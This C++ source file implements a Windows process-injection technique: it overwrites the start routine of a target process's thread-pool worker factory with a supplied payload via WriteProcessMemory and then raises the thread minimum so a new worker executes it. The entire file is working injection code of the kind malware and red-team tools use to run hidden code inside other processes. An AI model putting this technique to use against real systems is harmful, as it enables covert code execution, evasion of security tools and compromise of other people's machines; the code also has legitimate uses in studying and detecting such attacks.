#include "injection.h"

bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE hWorkerFactory, _In_ void* localPayloadAddress, _In_ size_t payloadSize) {

	NTSTATUS                          status = ERROR_SUCCESS;
	uint32_t                          oldProtect = 0;
	WORKER_FACTORY_BASIC_INFORMATION  workerFactoryInfo = { 0 };
	fnNtSetInformationWorkerFactory   pNtSetInformationWorkerFactory = nullptr;
	fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = nullptr;
	uint32_t                          threadMinimumCount = 0;


	//
	// Get function ptrs
	//

	pNtQueryInformationWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
			"NtQueryInformationWorkerFactory")
		);

	pNtSetInformationWorkerFactory = reinterpret_cast<fnNtSetInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
			"NtSetInformationWorkerFactory")
		);

	if (pNtSetInformationWorkerFactory == nullptr || pNtQueryInformationWorkerFactory == nullptr) {
		std::cerr << "{!!} Failed to get function pointers" << std::endl;
		return false;
	}



	//
	// Get Start Routine of the worker factory
	//

	status = pNtQueryInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryBasicInformation,
		&workerFactoryInfo,
		sizeof(WORKER_FACTORY_BASIC_INFORMATION),
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
		return false;
	}



	//
	// Change start routine to R/W and copy payload
	//

	if (!VirtualProtectEx(
		targetProcess,
		workerFactoryInfo.StartRoutine,
		payloadSize,
		PAGE_READWRITE,
		(PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx(First Call));
		return false;
	}

	if (!WriteProcessMemory(
		targetProcess,
		workerFactoryInfo.StartRoutine,
		localPayloadAddress,
		payloadSize,
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}

	if (!VirtualProtectEx( //< Revert protections
		targetProcess,
		workerFactoryInfo.StartRoutine,
		payloadSize,
		oldProtect,
		(PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx(Second Call));
		return false;
	}



	//
	// Increase minimum number of threads in the pool
	//

	threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1;

	status = pNtSetInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryThreadMinimum,
		&threadMinimumCount,
		sizeof(uint32_t));

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtSetInformationWorkerFactory, status);
		return false;
	}


	return true;
}